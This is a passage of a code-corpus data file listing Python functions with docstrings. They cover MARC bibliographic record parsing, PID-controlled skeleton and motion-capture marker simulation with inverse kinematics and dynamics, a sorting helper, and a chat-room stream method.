            "def _parse_corporations(self, datafield, subfield, roles=[\"any\"]):\n        \"\"\"\n        Parse informations about corporations from given field identified\n        by `datafield` parameter.\n\n        Args:\n            datafield (str): MARC field ID (\"``110``\", \"``610``\", etc..)\n            subfield (str):  MARC subfield ID with name, which is typically\n                             stored in \"``a``\" subfield.\n            roles (str): specify which roles you need. Set to ``[\"any\"]`` for\n                         any role, ``[\"dst\"]`` for distributors, etc.. For\n                         details, see\n                         http://www.loc.gov/marc/relators/relaterm.html\n\n        Returns:\n            list: :class:`Corporation` objects.\n        \"\"\"\n        if len(datafield) != 3:\n            raise ValueError(\n                \"datafield parameter have to be exactly 3 chars long!\"\n            )\n        if len(subfield) != 1:\n            raise ValueError(\n                \"Bad subfield specification - subield have to be 3 chars long!\"\n            )\n        parsed_corporations = []\n        for corporation in self.get_subfields(datafield, subfield):\n            other_subfields = corporation.other_subfields\n\n            # check if corporation have at least one of the roles specified in\n            # 'roles' parameter of function\n            if \"4\" in other_subfields and roles != [\"any\"]:\n                corp_roles = other_subfields[\"4\"]  # list of role parameters\n\n                relevant = any(map(lambda role: role in roles, corp_roles))\n\n                # skip non-relevant corporations\n                if not relevant:\n                    continue\n\n            name = \"\"\n            place = \"\"\n            date = \"\"\n\n            name = corporation\n\n            if \"c\" in other_subfields:\n                place = \",\".join(other_subfields[\"c\"])\n            if \"d\" in other_subfields:\n                date = \",\".join(other_subfields[\"d\"])\n\n            parsed_corporations.append(Corporation(name, place, date))\n\n        return parsed_corporations"
        ],
        [
            "def _parse_persons(self, datafield, subfield, roles=[\"aut\"]):\n        \"\"\"\n        Parse persons from given datafield.\n\n        Args:\n            datafield (str): code of datafield (\"010\", \"730\", etc..)\n            subfield (char):  code of subfield (\"a\", \"z\", \"4\", etc..)\n            role (list of str): set to [\"any\"] for any role, [\"aut\"] for\n                 authors, etc.. For details see\n                 http://www.loc.gov/marc/relators/relaterm.html\n\n        Main records for persons are: \"100\", \"600\" and \"700\", subrecords \"c\".\n\n        Returns:\n            list: Person objects.\n        \"\"\"\n        # parse authors\n        parsed_persons = []\n        raw_persons = self.get_subfields(datafield, subfield)\n        for person in raw_persons:\n            # check if person have at least one of the roles specified in\n            # 'roles' parameter of function\n            other_subfields = person.other_subfields\n            if \"4\" in other_subfields and roles != [\"any\"]:\n                person_roles = other_subfields[\"4\"]  # list of role parameters\n\n                relevant = any(map(lambda role: role in roles, person_roles))\n\n                # skip non-relevant persons\n                if not relevant:\n                    continue\n\n            # result of .strip() is string, so ind1/2 in MARCSubrecord are lost\n            ind1 = person.i1\n            ind2 = person.i2\n            person = person.strip()\n\n            name = \"\"\n            second_name = \"\"\n            surname = \"\"\n            title = \"\"\n\n            # here it gets nasty - there is lot of options in ind1/ind2\n            # parameters\n            if ind1 == \"1\" and ind2 == \" \":\n                if \",\" in person:\n                    surname, name = person.split(\",\", 1)\n                elif \" \" in person:\n                    surname, name = person.split(\" \", 1)\n                else:\n                    surname = person\n\n                if \"c\" in other_subfields:\n                    title = \",\".join(other_subfields[\"c\"])\n            elif ind1 == \"0\" and ind2 == \" \":\n                name = person.strip()\n\n                if \"b\" in other_subfields:\n                    second_name = \",\".join(other_subfields[\"b\"])\n\n                if \"c\" in other_subfields:\n                    surname = \",\".join(other_subfields[\"c\"])\n            elif ind1 == \"1\" and ind2 == \"0\" or ind1 == \"0\" and ind2 == \"0\":\n                name = person.strip()\n                if \"c\" in other_subfields:\n                    title = \",\".join(other_subfields[\"c\"])\n\n            parsed_persons.append(\n                Person(\n                    name.strip(),\n                    second_name.strip(),\n                    surname.strip(),\n                    title.strip()\n                )\n            )\n\n        return parsed_persons"
        ],
        [
            "def get_ISBNs(self):\n        \"\"\"\n        Get list of VALID ISBN.\n\n        Returns:\n            list: List with *valid* ISBN strings.\n        \"\"\"\n        invalid_isbns = set(self.get_invalid_ISBNs())\n\n        valid_isbns = [\n            self._clean_isbn(isbn)\n            for isbn in self[\"020a\"]\n            if self._clean_isbn(isbn) not in invalid_isbns\n        ]\n\n        if valid_isbns:\n            return valid_isbns\n\n        # this is used sometimes in czech national library\n        return [\n            self._clean_isbn(isbn)\n            for isbn in self[\"901i\"]\n        ]"
        ],
        [
            "def get_urls(self):\n        \"\"\"\n        Content of field ``856u42``. Typically URL pointing to producers\n        homepage.\n\n        Returns:\n            list: List of URLs defined by producer.\n        \"\"\"\n        urls = self.get_subfields(\"856\", \"u\", i1=\"4\", i2=\"2\")\n\n        return map(lambda x: x.replace(\"&amp;\", \"&\"), urls)"
        ],
        [
            "def get_internal_urls(self):\n        \"\"\"\n        URL's, which may point to edeposit, aleph, kramerius and so on.\n\n        Fields ``856u40``, ``998a`` and ``URLu``.\n\n        Returns:\n            list: List of internal URLs. \n        \"\"\"\n        internal_urls = self.get_subfields(\"856\", \"u\", i1=\"4\", i2=\"0\")\n        internal_urls.extend(self.get_subfields(\"998\", \"a\"))\n        internal_urls.extend(self.get_subfields(\"URL\", \"u\"))\n\n        return map(lambda x: x.replace(\"&amp;\", \"&\"), internal_urls)"
        ],
        [
            "def pid(kp=0., ki=0., kd=0., smooth=0.1):\n    r'''Create a callable that implements a PID controller.\n\n    A PID controller returns a control signal :math:`u(t)` given a history of\n    error measurements :math:`e(0) \\dots e(t)`, using proportional (P), integral\n    (I), and derivative (D) terms, according to:\n\n    .. math::\n\n       u(t) = kp * e(t) + ki * \\int_{s=0}^t e(s) ds + kd * \\frac{de(s)}{ds}(t)\n\n    The proportional term is just the current error, the integral term is the\n    sum of all error measurements, and the derivative term is the instantaneous\n    derivative of the error measurement.\n\n    Parameters\n    ----------\n    kp : float\n        The weight associated with the proportional term of the PID controller.\n    ki : float\n        The weight associated with the integral term of the PID controller.\n    kd : float\n        The weight associated with the derivative term of the PID controller.\n    smooth : float in [0, 1]\n        Derivative values will be smoothed with this exponential average. A\n        value of 1 never incorporates new derivative information, a value of 0.5\n        uses the mean of the historic and new information, and a value of 0\n        discards historic information (i.e., the derivative in this case will be\n        unsmoothed). The default is 0.1.\n\n    Returns\n    -------\n    controller : callable (float, float) -> float\n        Returns a function that accepts an error measurement and a delta-time\n        value since the previous measurement, and returns a control signal.\n    '''\n    state = dict(p=0, i=0, d=0)\n\n    def control(error, dt=1):\n        state['d'] = smooth * state['d'] + (1 - smooth) * (error - state['p']) / dt\n        state['i'] += error * dt\n        state['p'] = error\n        return kp * state['p'] + ki * state['i'] + kd * state['d']\n\n    return control"
        ],
        [
            "def as_flat_array(iterables):\n    '''Given a sequence of sequences, return a flat numpy array.\n\n    Parameters\n    ----------\n    iterables : sequence of sequence of number\n        A sequence of tuples or lists containing numbers. Typically these come\n        from something that represents each joint in a skeleton, like angle.\n\n    Returns\n    -------\n    ndarray :\n        An array of flattened data from each of the source iterables.\n    '''\n    arr = []\n    for x in iterables:\n        arr.extend(x)\n    return np.array(arr)"
        ],
        [
            "def load(self, source, **kwargs):\n        '''Load a skeleton definition from a file.\n\n        Parameters\n        ----------\n        source : str or file\n            A filename or file-like object that contains text information\n            describing a skeleton. See :class:`pagoda.parser.Parser` for more\n            information about the format of the text file.\n        '''\n        if hasattr(source, 'endswith') and source.lower().endswith('.asf'):\n            self.load_asf(source, **kwargs)\n        else:\n            self.load_skel(source, **kwargs)"
        ],
        [
            "def load_skel(self, source, **kwargs):\n        '''Load a skeleton definition from a text file.\n\n        Parameters\n        ----------\n        source : str or file\n            A filename or file-like object that contains text information\n            describing a skeleton. See :class:`pagoda.parser.BodyParser` for\n            more information about the format of the text file.\n        '''\n        logging.info('%s: parsing skeleton configuration', source)\n        if hasattr(source, 'read'):\n            p = parser.parse(source, self.world, self.jointgroup, **kwargs)\n        else:\n            with open(source) as handle:\n                p = parser.parse(handle, self.world, self.jointgroup, **kwargs)\n        self.bodies = p.bodies\n        self.joints = p.joints\n        self.set_pid_params(kp=0.999 / self.world.dt)"
        ],
        [
            "def load_asf(self, source, **kwargs):\n        '''Load a skeleton definition from an ASF text file.\n\n        Parameters\n        ----------\n        source : str or file\n            A filename or file-like object that contains text information\n            describing a skeleton, in ASF format.\n        '''\n        if hasattr(source, 'read'):\n            p = parser.parse_asf(source, self.world, self.jointgroup, **kwargs)\n        else:\n            with open(source) as handle:\n                p = parser.parse_asf(handle, self.world, self.jointgroup, **kwargs)\n        self.bodies = p.bodies\n        self.joints = p.joints\n        self.set_pid_params(kp=0.999 / self.world.dt)"
        ],
        [
            "def set_pid_params(self, *args, **kwargs):\n        '''Set PID parameters for all joints in the skeleton.\n\n        Parameters for this method are passed directly to the `pid` constructor.\n        '''\n        for joint in self.joints:\n            joint.target_angles = [None] * joint.ADOF\n            joint.controllers = [pid(*args, **kwargs) for i in range(joint.ADOF)]"
        ],
        [
            "def joint_torques(self):\n        '''Get a list of all current joint torques in the skeleton.'''\n        return as_flat_array(getattr(j, 'amotor', j).feedback[-1][:j.ADOF]\n                             for j in self.joints)"
        ],
        [
            "def indices_for_joint(self, name):\n        '''Get a list of the indices for a specific joint.\n\n        Parameters\n        ----------\n        name : str\n            The name of the joint to look up.\n\n        Returns\n        -------\n        list of int :\n            A list of the index values for quantities related to the named\n            joint. Often useful for getting, say, the angles for a specific\n            joint in the skeleton.\n        '''\n        j = 0\n        for joint in self.joints:\n            if joint.name == name:\n                return list(range(j, j + joint.ADOF))\n            j += joint.ADOF\n        return []"
        ],
        [
            "def indices_for_body(self, name, step=3):\n        '''Get a list of the indices for a specific body.\n\n        Parameters\n        ----------\n        name : str\n            The name of the body to look up.\n        step : int, optional\n            The number of numbers for each body. Defaults to 3, should be set\n            to 4 for body rotation (since quaternions have 4 values).\n\n        Returns\n        -------\n        list of int :\n            A list of the index values for quantities related to the named body.\n        '''\n        for j, body in enumerate(self.bodies):\n            if body.name == name:\n                return list(range(j * step, (j + 1) * step))\n        return []"
        ],
        [
            "def joint_distances(self):\n        '''Get the current joint separations for the skeleton.\n\n        Returns\n        -------\n        distances : list of float\n            A list expressing the distance between the two joint anchor points,\n            for each joint in the skeleton. These quantities describe how\n            \"exploded\" the bodies in the skeleton are; a value of 0 indicates\n            that the constraints are perfectly satisfied for that joint.\n        '''\n        return [((np.array(j.anchor) - j.anchor2) ** 2).sum() for j in self.joints]"
        ],
        [
            "def enable_motors(self, max_force):\n        '''Enable the joint motors in this skeleton.\n\n        This method sets the maximum force that can be applied by each joint to\n        attain the desired target velocities. It also enables torque feedback\n        for all joint motors.\n\n        Parameters\n        ----------\n        max_force : float\n            The maximum force that each joint is allowed to apply to attain its\n            target velocity.\n        '''\n        for joint in self.joints:\n            amotor = getattr(joint, 'amotor', joint)\n            amotor.max_forces = max_force\n            if max_force > 0:\n                amotor.enable_feedback()\n            else:\n                amotor.disable_feedback()"
        ],
        [
            "def set_target_angles(self, angles):\n        '''Move each joint toward a target angle.\n\n        This method uses a PID controller to set a target angular velocity for\n        each degree of freedom in the skeleton, based on the difference between\n        the current and the target angle for the respective DOF.\n\n        PID parameters are by default set to achieve a tiny bit less than\n        complete convergence in one time step, using only the P term (i.e., the\n        P coefficient is set to 1 - \\delta, while I and D coefficients are set\n        to 0). PID parameters can be updated by calling the `set_pid_params`\n        method.\n\n        Parameters\n        ----------\n        angles : list of float\n            A list of the target angles for every joint in the skeleton.\n        '''\n        j = 0\n        for joint in self.joints:\n            velocities = [\n                ctrl(tgt - cur, self.world.dt) for cur, tgt, ctrl in\n                zip(joint.angles, angles[j:j+joint.ADOF], joint.controllers)]\n            joint.velocities = velocities\n            j += joint.ADOF"
        ],
        [
            "def add_torques(self, torques):\n        '''Add torques for each degree of freedom in the skeleton.\n\n        Parameters\n        ----------\n        torques : list of float\n            A list of the torques to add to each degree of freedom in the\n            skeleton.\n        '''\n        j = 0\n        for joint in self.joints:\n            joint.add_torques(\n                list(torques[j:j+joint.ADOF]) + [0] * (3 - joint.ADOF))\n            j += joint.ADOF"
        ],
        [
            "def labels(self):\n        '''Return the names of our marker labels in canonical order.'''\n        return sorted(self.channels, key=lambda c: self.channels[c])"
        ],
        [
            "def load_csv(self, filename, start_frame=10, max_frames=int(1e300)):\n        '''Load marker data from a CSV file.\n\n        The file will be imported using Pandas, which must be installed to use\n        this method. (``pip install pandas``)\n\n        The first line of the CSV file will be used for header information. The\n        \"time\" column will be used as the index for the data frame. There must\n        be columns named 'markerAB-foo-x','markerAB-foo-y','markerAB-foo-z', and\n        'markerAB-foo-c' for marker 'foo' to be included in the model.\n\n        Parameters\n        ----------\n        filename : str\n            Name of the CSV file to load.\n        '''\n        import pandas as pd\n\n        compression = None\n        if filename.endswith('.gz'):\n            compression = 'gzip'\n        df = pd.read_csv(filename, compression=compression).set_index('time').fillna(-1)\n\n        # make sure the data frame's time index matches our world.\n        assert self.world.dt == pd.Series(df.index).diff().mean()\n\n        markers = []\n        for c in df.columns:\n            m = re.match(r'^marker\\d\\d-(.*)-c$', c)\n            if m:\n                markers.append(m.group(1))\n        self.channels = self._map_labels_to_channels(markers)\n\n        cols = [c for c in df.columns if re.match(r'^marker\\d\\d-.*-[xyzc]$', c)]\n        self.data = df[cols].values.reshape((len(df), len(markers), 4))[start_frame:]\n        self.data[:, :, [1, 2]] = self.data[:, :, [2, 1]]\n\n        logging.info('%s: loaded marker data %s', filename, self.data.shape)\n        self.process_data()\n        self.create_bodies()"
        ],
        [
            "def load_c3d(self, filename, start_frame=0, max_frames=int(1e300)):\n        '''Load marker data from a C3D file.\n\n        The file will be imported using the c3d module, which must be installed\n        to use this method. (``pip install c3d``)\n\n        Parameters\n        ----------\n        filename : str\n            Name of the C3D file to load.\n        start_frame : int, optional\n            Discard the first N frames. Defaults to 0.\n        max_frames : int, optional\n            Maximum number of frames to load. Defaults to loading all frames.\n        '''\n        import c3d\n\n        with open(filename, 'rb') as handle:\n            reader = c3d.Reader(handle)\n\n            logging.info('world frame rate %s, marker frame rate %s',\n                         1 / self.world.dt, reader.point_rate)\n\n            # set up a map from marker label to index in the data stream.\n            self.channels = self._map_labels_to_channels([\n                s.strip() for s in reader.point_labels])\n\n            # read the actual c3d data into a numpy array.\n            data = []\n            for i, (_, frame, _) in enumerate(reader.read_frames()):\n                if i >= start_frame:\n                    data.append(frame[:, [0, 1, 2, 4]])\n                if len(data) > max_frames:\n                    break\n            self.data = np.array(data)\n\n            # scale the data to meters -- mm is a very common C3D unit.\n            if reader.get('POINT:UNITS').string_value.strip().lower() == 'mm':\n                logging.info('scaling point data from mm to m')\n                self.data[:, :, :3] /= 1000.\n\n        logging.info('%s: loaded marker data %s', filename, self.data.shape)\n        self.process_data()\n        self.create_bodies()"
        ],
        [
            "def process_data(self):\n        '''Process data to produce velocity and dropout information.'''\n        self.visibility = self.data[:, :, 3]\n        self.positions = self.data[:, :, :3]\n        self.velocities = np.zeros_like(self.positions) + 1000\n        for frame_no in range(1, len(self.data) - 1):\n            prev = self.data[frame_no - 1]\n            next = self.data[frame_no + 1]\n            for c in range(self.num_markers):\n                if -1 < prev[c, 3] < 100 and -1 < next[c, 3] < 100:\n                    self.velocities[frame_no, c] = (\n                        next[c, :3] - prev[c, :3]) / (2 * self.world.dt)\n        self.cfms = np.zeros_like(self.visibility) + self.DEFAULT_CFM"
        ],
        [
            "def create_bodies(self):\n        '''Create physics bodies corresponding to each marker in our data.'''\n        self.bodies = {}\n        for label in self.channels:\n            body = self.world.create_body(\n                'sphere', name='marker:{}'.format(label), radius=0.02)\n            body.is_kinematic = True\n            body.color = 0.9, 0.1, 0.1, 0.5\n            self.bodies[label] = body"
        ],
        [
            "def load_attachments(self, source, skeleton):\n        '''Load attachment configuration from the given text source.\n\n        The attachment configuration file has a simple format. After discarding\n        Unix-style comments (any part of a line that starts with the pound (#)\n        character), each line in the file is then expected to have the following\n        format::\n\n            marker-name body-name X Y Z\n\n        The marker name must correspond to an existing \"channel\" in our marker\n        data. The body name must correspond to a rigid body in the skeleton. The\n        X, Y, and Z coordinates specify the body-relative offsets where the\n        marker should be attached: 0 corresponds to the center of the body along\n        the given axis, while -1 and 1 correspond to the minimal (maximal,\n        respectively) extent of the body's bounding box along the corresponding\n        dimension.\n\n        Parameters\n        ----------\n        source : str or file-like\n            A filename or file-like object that we can use to obtain text\n            configuration that describes how markers are attached to skeleton\n            bodies.\n\n        skeleton : :class:`pagoda.skeleton.Skeleton`\n            The skeleton to attach our marker data to.\n        '''\n        self.targets = {}\n        self.offsets = {}\n\n        filename = source\n        if isinstance(source, str):\n            source = open(source)\n        else:\n            filename = '(file-{})'.format(id(source))\n\n        for i, line in enumerate(source):\n            tokens = line.split('#')[0].strip().split()\n            if not tokens:\n                continue\n            label = tokens.pop(0)\n            if label not in self.channels:\n                logging.info('%s:%d: unknown marker %s', filename, i, label)\n                continue\n            if not tokens:\n                continue\n            name = tokens.pop(0)\n            bodies = [b for b in skeleton.bodies if b.name == name]\n            if len(bodies) != 1:\n                logging.info('%s:%d: %d skeleton bodies match %s',\n                             filename, i, len(bodies), name)\n                continue\n            b = self.targets[label] = bodies[0]\n            o = self.offsets[label] = \\\n                np.array(list(map(float, tokens))) * b.dimensions / 2\n            logging.info('%s <--> %s, offset %s', label, b.name, o)"
        ],
        [
            "def attach(self, frame_no):\n        '''Attach marker bodies to the corresponding skeleton bodies.\n\n        Attachments are only made for markers that are not in a dropout state in\n        the given frame.\n\n        Parameters\n        ----------\n        frame_no : int\n            The frame of data we will use for attaching marker bodies.\n        '''\n        assert not self.joints\n        for label, j in self.channels.items():\n            target = self.targets.get(label)\n            if target is None:\n                continue\n            if self.visibility[frame_no, j] < 0:\n                continue\n            if np.linalg.norm(self.velocities[frame_no, j]) > 10:\n                continue\n            joint = ode.BallJoint(self.world.ode_world, self.jointgroup)\n            joint.attach(self.bodies[label].ode_body, target.ode_body)\n            joint.setAnchor1Rel([0, 0, 0])\n            joint.setAnchor2Rel(self.offsets[label])\n            joint.setParam(ode.ParamCFM, self.cfms[frame_no, j])\n            joint.setParam(ode.ParamERP, self.erp)\n            joint.name = label\n            self.joints[label] = joint\n        self._frame_no = frame_no"
        ],
        [
            "def reposition(self, frame_no):\n        '''Reposition markers to a specific frame of data.\n\n        Parameters\n        ----------\n        frame_no : int\n            The frame of data where we should reposition marker bodies. Markers\n            will be positioned in the appropriate places in world coordinates.\n            In addition, linear velocities of the markers will be set according\n            to the data as long as there are no dropouts in neighboring frames.\n        '''\n        for label, j in self.channels.items():\n            body = self.bodies[label]\n            body.position = self.positions[frame_no, j]\n            body.linear_velocity = self.velocities[frame_no, j]"
        ],
        [
            "def distances(self):\n        '''Get a list of the distances between markers and their attachments.\n\n        Returns\n        -------\n        distances : ndarray of shape (num-markers, 3)\n            Array of distances for each marker joint in our attachment setup. If\n            a marker does not currently have an associated joint (e.g. because\n            it is not currently visible) this will contain NaN for that row.\n        '''\n        distances = []\n        for label in self.labels:\n            joint = self.joints.get(label)\n            distances.append([np.nan, np.nan, np.nan] if joint is None else\n                             np.array(joint.getAnchor()) - joint.getAnchor2())\n        return np.array(distances)"
        ],
        [
            "def forces(self, dx_tm1=None):\n        '''Return an array of the forces exerted by marker springs.\n\n        Notes\n        -----\n\n        The forces exerted by the marker springs can be approximated by::\n\n          F = kp * dx\n\n        where ``dx`` is the current array of marker distances. An even more\n        accurate value is computed by approximating the velocity of the spring\n        displacement::\n\n          F = kp * dx + kd * (dx - dx_tm1) / dt\n\n        where ``dx_tm1`` is an array of distances from the previous time step.\n\n        Parameters\n        ----------\n        dx_tm1 : ndarray\n            An array of distances from markers to their attachment targets,\n            measured at the previous time step.\n\n        Returns\n        -------\n        F : ndarray\n            An array of forces that the markers are exerting on the skeleton.\n        '''\n        cfm = self.cfms[self._frame_no][:, None]\n        kp = self.erp / (cfm * self.world.dt)\n        kd = (1 - self.erp) / cfm\n        dx = self.distances()\n        F = kp * dx\n        if dx_tm1 is not None:\n            bad = np.isnan(dx) | np.isnan(dx_tm1)\n            F[~bad] += (kd * (dx - dx_tm1) / self.world.dt)[~bad]\n        return F"
        ],
        [
            "def load_skeleton(self, filename, pid_params=None):\n        '''Create and configure a skeleton in our model.\n\n        Parameters\n        ----------\n        filename : str\n            The name of a file containing skeleton configuration data.\n        pid_params : dict, optional\n            If given, use this dictionary to set the PID controller\n            parameters on each joint in the skeleton. See\n            :func:`pagoda.skeleton.pid` for more information.\n        '''\n        self.skeleton = skeleton.Skeleton(self)\n        self.skeleton.load(filename, color=(0.3, 0.5, 0.9, 0.8))\n        if pid_params:\n            self.skeleton.set_pid_params(**pid_params)\n        self.skeleton.erp = 0.1\n        self.skeleton.cfm = 0"
        ],
        [
            "def load_markers(self, filename, attachments, max_frames=1e100):\n        '''Load marker data and attachment preferences into the model.\n\n        Parameters\n        ----------\n        filename : str\n            The name of a file containing marker data. This currently needs to\n            be either a .C3D or a .CSV file. CSV files must adhere to a fairly\n            strict column naming convention; see :func:`Markers.load_csv` for\n            more information.\n        attachments : str\n            The name of a text file specifying how markers are attached to\n            skeleton bodies.\n        max_frames : number, optional\n            Only read in this many frames of marker data. By default, the entire\n            data file is read into memory.\n\n        Returns\n        -------\n        markers : :class:`Markers`\n            Returns a markers object containing loaded marker data as well as\n            skeleton attachment configuration.\n        '''\n        self.markers = Markers(self)\n        fn = filename.lower()\n        if fn.endswith('.c3d'):\n            self.markers.load_c3d(filename, max_frames=max_frames)\n        elif fn.endswith('.csv') or fn.endswith('.csv.gz'):\n            self.markers.load_csv(filename, max_frames=max_frames)\n        else:\n            logging.fatal('%s: not sure how to load markers!', filename)\n        self.markers.load_attachments(attachments, self.skeleton)"
        ],
        [
            "def step(self, substeps=2):\n        '''Advance the physics world by one step.\n\n        Typically this is called as part of a :class:`pagoda.viewer.Viewer`, but\n        it can also be called manually (or some other stepping mechanism\n        entirely can be used).\n        '''\n        # by default we step by following our loaded marker data.\n        self.frame_no += 1\n        try:\n            next(self.follower)\n        except (AttributeError, StopIteration) as err:\n            self.reset()"
        ],
        [
            "def settle_to_markers(self, frame_no=0, max_distance=0.05, max_iters=300,\n                          states=None):\n        '''Settle the skeleton to our marker data at a specific frame.\n\n        Parameters\n        ----------\n        frame_no : int, optional\n            Settle the skeleton to marker data at this frame. Defaults to 0.\n        max_distance : float, optional\n            The settling process will stop when the mean marker distance falls\n            below this threshold. Defaults to 0.1m (10cm). Setting this too\n            small prevents the settling process from finishing (it will loop\n            indefinitely), and setting it too large prevents the skeleton from\n            settling to a stable state near the markers.\n        max_iters : int, optional\n            Attempt to settle markers for at most this many iterations. Defaults\n            to 1000.\n        states : list of body states, optional\n            If given, set the bodies in our skeleton to these kinematic states\n            before starting the settling process.\n        '''\n        if states is not None:\n            self.skeleton.set_body_states(states)\n        dist = None\n        for _ in range(max_iters):\n            for _ in self._step_to_marker_frame(frame_no):\n                pass\n            dist = np.nanmean(abs(self.markers.distances()))\n            logging.info('settling to frame %d: marker distance %.3f', frame_no, dist)\n            if dist < max_distance:\n                return self.skeleton.get_body_states()\n            for b in self.skeleton.bodies:\n                b.linear_velocity = 0, 0, 0\n                b.angular_velocity = 0, 0, 0\n        return states"
        ],
        [
            "def follow_markers(self, start=0, end=1e100, states=None):\n        '''Iterate over a set of marker data, dragging its skeleton along.\n\n        Parameters\n        ----------\n        start : int, optional\n            Start following marker data after this frame. Defaults to 0.\n        end : int, optional\n            Stop following marker data after this frame. Defaults to the end of\n            the marker data.\n        states : list of body states, optional\n            If given, set the states of the skeleton bodies to these values\n            before starting to follow the marker data.\n        '''\n        if states is not None:\n            self.skeleton.set_body_states(states)\n        for frame_no, frame in enumerate(self.markers):\n            if frame_no < start:\n                continue\n            if frame_no >= end:\n                break\n            for states in self._step_to_marker_frame(frame_no):\n                yield states"
        ],
        [
            "def _step_to_marker_frame(self, frame_no, dt=None):\n        '''Update the simulator to a specific frame of marker data.\n\n        This method returns a generator of body states for the skeleton! This\n        generator must be exhausted (e.g., by consuming this call in a for loop)\n        for the simulator to work properly.\n\n        This process involves the following steps:\n\n        - Move the markers to their new location:\n          - Detach from the skeleton\n          - Update marker locations\n          - Reattach to the skeleton\n        - Detect ODE collisions\n        - Yield the states of the bodies in the skeleton\n        - Advance the ODE world one step\n\n        Parameters\n        ----------\n        frame_no : int\n            Step to this frame of marker data.\n        dt : float, optional\n            Step with this time duration. Defaults to ``self.dt``.\n\n        Returns\n        -------\n        states : sequence of state tuples\n            A generator of a sequence of one body state for the skeleton. This\n            generator must be exhausted for the simulation to work properly.\n        '''\n        # update the positions and velocities of the markers.\n        self.markers.detach()\n        self.markers.reposition(frame_no)\n        self.markers.attach(frame_no)\n\n        # detect collisions.\n        self.ode_space.collide(None, self.on_collision)\n\n        # record the state of each skeleton body.\n        states = self.skeleton.get_body_states()\n        self.skeleton.set_body_states(states)\n\n        # yield the current simulation state to our caller.\n        yield states\n\n        # update the ode world.\n        self.ode_world.step(dt or self.dt)\n\n        # clear out contact joints to prepare for the next frame.\n        self.ode_contactgroup.empty()"
        ],
        [
            "def inverse_kinematics(self, start=0, end=1e100, states=None, max_force=20):\n        '''Follow a set of marker data, yielding kinematic joint angles.\n\n        Parameters\n        ----------\n        start : int, optional\n            Start following marker data after this frame. Defaults to 0.\n        end : int, optional\n            Stop following marker data after this frame. Defaults to the end of\n            the marker data.\n        states : list of body states, optional\n            If given, set the states of the skeleton bodies to these values\n            before starting to follow the marker data.\n        max_force : float, optional\n            Allow each degree of freedom in the skeleton to exert at most this\n            force when attempting to maintain its equilibrium position. This\n            defaults to 20N. Set this value higher to simulate a stiff skeleton\n            while following marker data.\n\n        Returns\n        -------\n        angles : sequence of angle frames\n            Returns a generator of joint angle data for the skeleton. One set of\n            joint angles will be generated for each frame of marker data between\n            `start` and `end`.\n        '''\n        zeros = None\n        if max_force > 0:\n            self.skeleton.enable_motors(max_force)\n            zeros = np.zeros(self.skeleton.num_dofs)\n        for _ in self.follow_markers(start, end, states):\n            if zeros is not None:\n                self.skeleton.set_target_angles(zeros)\n            yield self.skeleton.joint_angles"
        ],
        [
            "def inverse_dynamics(self, angles, start=0, end=1e100, states=None, max_force=100):\n        '''Follow a set of angle data, yielding dynamic joint torques.\n\n        Parameters\n        ----------\n        angles : ndarray (num-frames x num-dofs)\n            Follow angle data provided by this array of angle values.\n        start : int, optional\n            Start following angle data after this frame. Defaults to the start\n            of the angle data.\n        end : int, optional\n            Stop following angle data after this frame. Defaults to the end of\n            the angle data.\n        states : list of body states, optional\n            If given, set the states of the skeleton bodies to these values\n            before starting to follow the marker data.\n        max_force : float, optional\n            Allow each degree of freedom in the skeleton to exert at most this\n            force when attempting to follow the given joint angles. Defaults to\n            100N. Setting this value to be large results in more accurate\n            following but can cause oscillations in the PID controllers,\n            resulting in noisy torques.\n\n        Returns\n        -------\n        torques : sequence of torque frames\n            Returns a generator of joint torque data for the skeleton. One set\n            of joint torques will be generated for each frame of angle data\n            between `start` and `end`.\n        '''\n        if states is not None:\n            self.skeleton.set_body_states(states)\n\n        for frame_no, frame in enumerate(angles):\n            if frame_no < start:\n                continue\n            if frame_no >= end:\n                break\n\n            self.ode_space.collide(None, self.on_collision)\n\n            states = self.skeleton.get_body_states()\n            self.skeleton.set_body_states(states)\n\n            # joseph's stability fix: step to compute torques, then reset the\n            # skeleton to the start of the step, and then step using computed\n            # torques. thus any numerical errors between the body states after\n            # stepping using angle constraints will be removed, because we\n            # will be stepping the model using the computed torques.\n\n            self.skeleton.enable_motors(max_force)\n            self.skeleton.set_target_angles(angles[frame_no])\n            self.ode_world.step(self.dt)\n            torques = self.skeleton.joint_torques\n            self.skeleton.disable_motors()\n\n            self.skeleton.set_body_states(states)\n            self.skeleton.add_torques(torques)\n            yield torques\n            self.ode_world.step(self.dt)\n\n            self.ode_contactgroup.empty()"
        ],
        [
            "def forward_dynamics(self, torques, start=0, states=None):\n        '''Move the body according to a set of torque data.'''\n        if states is not None:\n            self.skeleton.set_body_states(states)\n        for frame_no, torque in enumerate(torques):\n            if frame_no < start:\n                continue\n            if frame_no >= end:\n                break\n            self.ode_space.collide(None, self.on_collision)\n            self.skeleton.add_torques(torque)\n            self.ode_world.step(self.dt)\n            yield\n            self.ode_contactgroup.empty()"
        ],
        [
            "def resorted(values):\n    \"\"\"\n    Sort values, but put numbers after alphabetically sorted words.\n\n    This function is here to make outputs diff-compatible with Aleph.\n\n    Example::\n        >>> sorted([\"b\", \"1\", \"a\"])\n        ['1', 'a', 'b']\n        >>> resorted([\"b\", \"1\", \"a\"])\n        ['a', 'b', '1']\n\n    Args:\n        values (iterable): any iterable object/list/tuple/whatever.\n\n    Returns:\n        list of sorted values, but with numbers after words\n    \"\"\"\n    if not values:\n        return values\n\n    values = sorted(values)\n\n    # look for first word\n    first_word = next(\n        (cnt for cnt, val in enumerate(values)\n             if val and not val[0].isdigit()),\n        None\n    )\n\n    # if not found, just return the values\n    if first_word is None:\n        return values\n\n    words = values[first_word:]\n    numbers = values[:first_word]\n\n    return words + numbers"
        ],
        [
            "def render(self, dt):\n        '''Draw all bodies in the world.'''\n        for frame in self._frozen:\n            for body in frame:\n                self.draw_body(body)\n        for body in self.world.bodies:\n            self.draw_body(body)\n\n        if hasattr(self.world, 'markers'):\n            # draw line between anchor1 and anchor2 for marker joints.\n            window.glColor4f(0.9, 0.1, 0.1, 0.9)\n            window.glLineWidth(3)\n            for j in self.world.markers.joints.values():\n                window.glBegin(window.GL_LINES)\n                window.glVertex3f(*j.getAnchor())\n                window.glVertex3f(*j.getAnchor2())\n                window.glEnd()"
        ],
        [
            "def get_stream(self, error_callback=None, live=True):\n        \"\"\" Get room stream to listen for messages.\n\n        Kwargs:\n            error_callback (func): Callback to call when an error occurred (parameters: exception)\n            live (bool): If True, issue a live stream, otherwise an offline stream\n\n        Returns:\n            :class:`Stream`. Stream\n        \"\"\"\n        self.join()\n        return Stream(self, error_callback=error_callback, live=live)"
        ],
        [
